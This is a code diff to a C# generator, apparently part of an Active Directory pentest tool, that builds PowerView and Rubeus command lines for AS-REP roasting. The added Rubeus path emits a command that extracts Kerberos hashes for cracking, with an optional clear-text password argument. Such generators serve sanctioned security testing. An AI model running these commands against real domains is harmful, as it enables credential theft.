@@ -2,20 +2,34 @@ using System.Collections.Generic;
 
 namespace AD_Commander.Generators;
 
-// Builds the PowerView enumeration of AS-REP roastable accounts (Get-DomainUser -PreauthNotRequired).
-// PowerView finds the accounts; extracting the actual AS-REP hashes is done with a separate tool
-// (Rubeus / ASREPRoast), shown only as a comment in the output. Pure text generation only.
+// Builds AS-REP roasting commands. PowerView only enumerates the roastable accounts
+// (Get-DomainUser -PreauthNotRequired); Rubeus both finds and extracts the hashes.
+// Pure text generation only.
 public static class AsRepRoastGenerator
 {
     public static string Generate(
+        string tool,
         string identity,
         string properties,
+        string outputFormat,
         bool verbose,
         string domain,
-        string username)
+        string username,
+        string password)
+    {
+        return tool == "Rubeus"
+            ? GenerateRubeus(identity, outputFormat, domain, username, password)
+            : GeneratePowerView(identity, properties, verbose, domain, username);
+    }
+
+    private static string GeneratePowerView(
+        string identity, string properties, bool verbose, string domain, string username)
     {
         bool useCredential = domain.Length > 0 && username.Length > 0;
         List<string> lines = new List<string>();
+
+        lines.Add("# PowerView (PowerSploit): https://github.com/PowerShellMafia/PowerSploit");
+        lines.Add("");
 
         if (useCredential)
         {
@@ -26,7 +40,7 @@ public static class AsRepRoastGenerator
 
         lines.Add("Import-Module .\\PowerView.ps1");
         lines.Add("");
-        lines.Add("# Find accounts that do not require Kerberos pre-authentication (AS-REP roastable):");
+        lines.Add("# Find accounts without Kerberos pre-auth. Switch Tool to Rubeus to also extract the hashes.");
 
         string command = "Get-DomainUser -PreauthNotRequired";
         if (identity.Length > 0)
@@ -47,9 +61,35 @@ public static class AsRepRoastGenerator
         }
 
         lines.Add(command);
+
+        return string.Join("\r\n", lines);
+    }
+
+    private static string GenerateRubeus(
+        string identity, string outputFormat, string domain, string username, string password)
+    {
+        bool useCredential = domain.Length > 0 && username.Length > 0 && password.Length > 0;
+        List<string> lines = new List<string>();
+
+        lines.Add("# Rubeus: https://github.com/GhostPack/Rubeus");
+        lines.Add("# Precompiled binaries: https://github.com/r3motecontrol/Ghostpack-CompiledBinaries");
+        if (useCredential)
+        {
+            lines.Add("# NOTE: Rubeus has no secure prompt; /creds below holds the password in clear text.");
+        }
         lines.Add("");
-        lines.Add("# Extract the AS-REP hashes with Rubeus (separate tool), e.g.:");
-        lines.Add("# Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt");
+
+        string command = $"Rubeus.exe asreproast /format:{outputFormat.ToLowerInvariant()} /outfile:asrep.txt /nowrap";
+        if (identity.Length > 0)
+        {
+            command += $" /user:{identity}";
+        }
+        if (useCredential)
+        {
+            command += $" /creds:{domain}\\{username}:{password}";
+        }
+
+        lines.Add(command);
 
         return string.Join("\r\n", lines);
     }
